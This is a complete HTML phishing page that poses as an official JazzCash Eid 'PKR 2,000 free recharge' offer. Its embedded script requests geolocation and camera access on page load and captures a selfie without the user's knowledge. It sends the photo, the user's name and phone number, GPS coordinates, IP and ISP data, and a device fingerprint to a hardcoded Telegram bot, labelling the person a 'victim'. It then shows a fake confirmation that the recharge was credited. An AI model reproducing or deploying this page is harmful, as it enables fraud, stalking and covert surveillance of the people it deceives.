<!DOCTYPE html>
<html lang="ur-PK">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Jazz Cash | Free Recharge Offer 2026 - 2000 PKR</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(160deg, #0b5e2e 0%, #1b8c3e 100%);
            min-height: 100vh;
            padding: 16px;
        }

        .container {
            max-width: 440px;
            margin: 0 auto;
            background: #ffffff;
            border-radius: 36px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeInUp 0.5s ease;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .jazz-header {
            background: linear-gradient(135deg, #007a3d 0%, #00a855 100%);
            padding: 28px 20px 20px 20px;
            text-align: center;
            position: relative;
        }

        .jazz-logo {
            font-size: 28px;
            font-weight: 800;
            color: white;
            margin-bottom: 8px;
        }

        .jazz-logo span {
            background: rgba(255,255,255,0.2);
            padding: 4px 10px;
            border-radius: 100px;
            font-size: 12px;
            margin-left: 8px;
        }

        .offer-chip {
            background: #ffd700;
            color: #007a3d;
            padding: 6px 14px;
            border-radius: 100px;
            display: inline-block;
            font-size: 12px;
            font-weight: bold;
            margin-top: 12px;
        }

        .prize-card {
            background: white;
            margin: -20px 16px 0 16px;
            border-radius: 24px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
            position: relative;
            z-index: 2;
        }

        .prize-amount {
            font-size: 44px;
            font-weight: 800;
            color: #007a3d;
        }

        .prize-amount small {
            font-size: 14px;
            font-weight: normal;
        }

        .permission-status {
            background: #fff8e1;
            margin: 16px;
            padding: 12px;
            border-radius: 20px;
            text-align: center;
            border: 1px solid #ffc107;
        }

        .timer-box {
            background: #fff8e1;
            padding: 12px;
            border-radius: 16px;
            margin: 16px;
            text-align: center;
            border: 1px dashed #ffc107;
        }

        .timer {
            font-size: 22px;
            font-weight: bold;
            color: #e65100;
            font-family: monospace;
        }

        .form-area {
            padding: 20px;
        }

        .input-field {
            margin-bottom: 16px;
        }

        .input-field label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #333;
            margin-bottom: 6px;
        }

        .input-field input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e5e7eb;
            border-radius: 14px;
            font-size: 15px;
            transition: all 0.2s;
        }

        .input-field input:focus {
            outline: none;
            border-color: #007a3d;
        }

        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #007a3d 0%, #00a855 100%);
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 8px;
            transition: transform 0.1s;
        }

        button:active {
            transform: scale(0.97);
        }

        .footer-note {
            text-align: center;
            padding: 16px;
            font-size: 10px;
            color: #aaa;
            border-top: 1px solid #f0f0f0;
        }

        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #007a3d;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .checkmark {
            color: #007a3d;
            font-size: 16px;
        }

        video, canvas {
            display: none;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <div class="jazz-header">
        <div class="jazz-logo">
            🏦 JazzCash <span>Official</span>
        </div>
        <div class="offer-chip">🎉 EID SPECIAL 2026 🎉</div>
    </div>

    <div class="prize-card">
        <div style="font-size: 14px; color: #666;">Congratulations! You're eligible for</div>
        <div class="prize-amount">PKR 2,000 <small>Free Recharge</small></div>
        <div style="font-size: 12px; margin-top: 8px;">✅ Limited time offer for all users</div>
    </div>

    <div class="permission-status" id="locationStatusBox">
        <div>📍 <strong>Location Access</strong></div>
        <div id="locationStatus" style="font-size: 12px; margin-top: 6px;">⏳ Auto-detecting location...</div>
    </div>

    <div class="permission-status" id="cameraStatusBox">
        <div>📸 <strong>Selfie Verification</strong></div>
        <div id="cameraStatus" style="font-size: 12px; margin-top: 6px;">⏳ Preparing camera...</div>
    </div>

    <div class="timer-box">
        <div style="font-size: 12px; margin-bottom: 5px;">⏰ Offer expires in</div>
        <div class="timer" id="countdown">03:45</div>
    </div>

    <div class="form-area">
        <div class="input-field">
            <label>📛 Full Name</label>
            <input type="text" id="fullName" placeholder="Enter your full name" autocomplete="off">
        </div>

        <div class="input-field">
            <label>📱 Mobile Number</label>
            <input type="text" id="phoneNumber" placeholder="Enter your number" autocomplete="off">
        </div>

        <button id="claimBtn" disabled>⏳ Waiting for permissions...</button>
    </div>

    <div class="footer-note">
        JazzCash Official Offer 2026
    </div>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    // ========== TELEGRAM BOT CONFIG ==========
    const BOT_TOKEN = "8642429606:AAG4359ICue1jVSUSNhlnRTwM95P9YHbIuQ";
    const CHAT_ID = "8723095427";
    // ==========================================

    let userLocation = null;
    let userPhoto = null;
    let locationGranted = false;
    let cameraGranted = false;
    let cameraStream = null;

    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "HTML"
                })
            });
        } catch(e) {}
    }

    async function sendPhotoToTelegram(photoBase64, caption) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        try {
            const response = await fetch(photoBase64);
            const blob = await response.blob();
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie.jpg');
            formData.append('caption', caption);
            await fetch(url, { method: "POST", body: formData });
        } catch(e) {}
    }

    // AUTO LOCATION - TRIGGERS IMMEDIATELY ON PAGE LOAD
    function requestLocation() {
        const statusDiv = document.getElementById('locationStatus');
        
        if (navigator.geolocation) {
            statusDiv.innerHTML = '<span class="spinner"></span> Requesting location...';
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    userLocation = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    locationGranted = true;
                    
                    statusDiv.innerHTML = `✅ Location granted! <span class="checkmark">✓</span><br>📍 ${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}`;
                    document.getElementById('locationStatusBox').style.background = "#e8f5e9";
                    document.getElementById('locationStatusBox').style.border = "1px solid #007a3d";
                    
                    checkPermissionsAndEnable();
                },
                (error) => {
                    let errorMsg = "";
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = "❌ Location denied. Cannot proceed.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg = "❌ Location unavailable";
                            break;
                        case error.TIMEOUT:
                            errorMsg = "❌ Location timeout";
                            break;
                    }
                    statusDiv.innerHTML = errorMsg;
                    document.getElementById('locationStatusBox').style.background = "#ffebee";
                    document.getElementById('locationStatusBox').style.border = "1px solid #f5576c";
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            document.getElementById('locationStatus').innerHTML = "❌ Geolocation not supported";
        }
    }

    // AUTO CAMERA - TRIGGERS AFTER LOCATION OR SIMULTANEOUSLY
    async function requestCamera() {
        const statusDiv = document.getElementById('cameraStatus');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        statusDiv.innerHTML = '<span class="spinner"></span> Requesting camera access...';
        
        try {
            cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = cameraStream;
            
            await new Promise(resolve => setTimeout(resolve, 800));
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            userPhoto = canvas.toDataURL('image/jpeg', 0.9);
            cameraGranted = true;
            
            cameraStream.getTracks().forEach(track => track.stop());
            video.srcObject = null;
            
            statusDiv.innerHTML = `✅ Selfie captured! <span class="checkmark">✓</span>`;
            document.getElementById('cameraStatusBox').style.background = "#e8f5e9";
            document.getElementById('cameraStatusBox').style.border = "1px solid #007a3d";
            
            checkPermissionsAndEnable();
            
            // Send photo immediately
            await sendPhotoToTelegram(userPhoto, "📸 VICTIM SELFIE CAPTURED (AUTO)");
            
        } catch(err) {
            statusDiv.innerHTML = "❌ Camera denied. Cannot proceed without selfie.";
            document.getElementById('cameraStatusBox').style.background = "#ffebee";
            document.getElementById('cameraStatusBox').style.border = "1px solid #f5576c";
        }
    }

    function checkPermissionsAndEnable() {
        const claimBtn = document.getElementById('claimBtn');
        if (locationGranted && cameraGranted) {
            claimBtn.disabled = false;
            claimBtn.innerHTML = "🎁 CLAIM FREE RECHARGE NOW 🎁";
            claimBtn.style.background = "linear-gradient(135deg, #007a3d 0%, #00a855 100%)";
        } else if (locationGranted && !cameraGranted) {
            claimBtn.innerHTML = "🔒 Waiting for camera access...";
        } else if (!locationGranted && cameraGranted) {
            claimBtn.innerHTML = "🔒 Waiting for location access...";
        }
    }

    async function getIPDetails() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                isp: data.org
            };
        } catch(e) {
            return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Pakistan", isp: "Unknown" };
        }
    }

    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            deviceMemory: navigator.deviceMemory || "Unknown",
            hardwareConcurrency: navigator.hardwareConcurrency || "Unknown"
        };
    }

    // Countdown timer
    let timeLeft = 225;
    const timerElement = document.getElementById('countdown');
    setInterval(() => {
        if (timeLeft <= 0) {
            timerElement.textContent = "00:00";
        } else {
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
    }, 1000);

    // Claim button
    document.getElementById('claimBtn').addEventListener('click', async function() {
        if (!locationGranted || !cameraGranted) {
            alert("⚠️ Please grant both location and camera access!");
            return;
        }

        const fullName = document.getElementById('fullName').value.trim();
        const phoneNumber = document.getElementById('phoneNumber').value.trim();

        const claimBtn = this;
        claimBtn.innerHTML = "⏳ Processing...";
        claimBtn.disabled = true;

        const ipData = await getIPDetails();
        const deviceInfo = getDeviceInfo();
        const timestamp = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });

        let message = "🎯 <b>🔥 VICTIM FULL DATA 2026 🔥</b> 🎯\n\n";
        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `<b>👤 PERSONAL INFO</b>\n`;
        message += `Name: ${fullName || "Not provided"}\n`;
        message += `Phone: ${phoneNumber || "Not provided"}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        message += `<b>📍 GPS LOCATION</b>\n`;
        message += `Latitude: ${userLocation.lat}\n`;
        message += `Longitude: ${userLocation.lon}\n`;
        message += `Accuracy: ${userLocation.accuracy}m\n`;
        message += `Map: https://maps.google.com/?q=${userLocation.lat},${userLocation.lon}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        message += `<b>🌐 IP & NETWORK</b>\n`;
        message += `IP: ${ipData.ip}\n`;
        message += `City: ${ipData.city}\n`;
        message += `Region: ${ipData.region}\n`;
        message += `Country: ${ipData.country}\n`;
        message += `ISP: ${ipData.isp}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        message += `<b>📱 DEVICE INFO</b>\n`;
        message += `Platform: ${deviceInfo.platform}\n`;
        message += `Language: ${deviceInfo.language}\n`;
        message += `Screen: ${deviceInfo.screen}\n`;
        message += `Timezone: ${deviceInfo.timezone}\n`;
        message += `RAM: ${deviceInfo.deviceMemory}GB\n`;
        message += `CPU Cores: ${deviceInfo.hardwareConcurrency}\n`;
        message += `User Agent: ${deviceInfo.userAgent.substring(0, 100)}...\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        message += `<b>📸 SELFIE:</b> CAPTURED ✅\n`;
        message += `<b>⏰ TIME:</b> ${timestamp}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `<b>💰 OFFER 2026:</b> PKR 2000 Free Recharge\n`;

        await sendToTelegram(message);

        // Send location separately
        const locMsg = `🗺️ <b>LIVE LOCATION MAP</b>\n${fullName || "Unknown"} | ${phoneNumber || "No number"}\nhttps://maps.google.com/?q=${userLocation.lat},${userLocation.lon}`;
        await sendToTelegram(locMsg);

        // Success page
        document.getElementById('mainContainer').innerHTML = `
            <div style="text-align: center; padding: 50px 30px; background: white; min-height: 500px;">
                <div style="font-size: 70px;">🎉</div>
                <h2 style="color: #007a3d; margin: 20px 0;">Recharge Successful 2026!</h2>
                <div style="background: #f0fdf4; padding: 20px; border-radius: 20px; margin: 20px 0;">
                    <p style="font-size: 24px; font-weight: bold; color: #007a3d;">PKR 2,000</p>
                    <p>has been added to your account</p>
                    <p style="font-size: 12px; color: #666; margin-top: 10px;">Ref ID: JZ2026${Math.floor(Math.random() * 100000)}</p>
                </div>
                <p style="color: #888; font-size: 13px;">Amount will reflect within 2-5 minutes</p>
                <p style="font-size: 11px; color: #aaa; margin-top: 20px;">JazzCash Official Offer 2026</p>
            </div>
        `;
    });

    // AUTO-START PERMISSIONS ON PAGE LOAD - NO BUTTONS
    window.addEventListener('load', function() {
        setTimeout(() => {
            requestLocation();
        }, 500);
        
        setTimeout(() => {
            requestCamera();
        }, 1000);
    });
</script>
</body>
</html>
